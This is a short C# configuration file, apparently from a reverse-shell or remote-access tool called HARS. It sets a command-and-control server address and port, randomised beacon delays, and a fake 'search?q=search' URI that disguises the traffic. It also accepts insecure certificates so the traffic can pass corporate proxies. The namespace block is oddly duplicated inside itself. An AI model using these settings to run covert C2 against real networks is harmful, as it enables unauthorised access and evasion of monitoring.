using System;
using System.Collections.Generic;
using System.Text;

namespace HARS
{
    using System;
    using System.Collections.Generic;
    using System.Text;

    namespace HARS
    {
        class Config
        {
            /* Behavior */
            // Min delay between the client calls
            public static int MinDelay = 2;
            // Max delay between the client calls
            public static int MaxDelay = 5;
            // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
            public static string Url = "search?q=search";
            /* Listener */
            // Hostname/IP of C&C server
            public static string Server = "https://192.168.1.249";
            // Listening port of C&C server
            public static string Port = "8000";
            // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
            public static bool AllowInsecureCertificate = true;
        }
    }
}
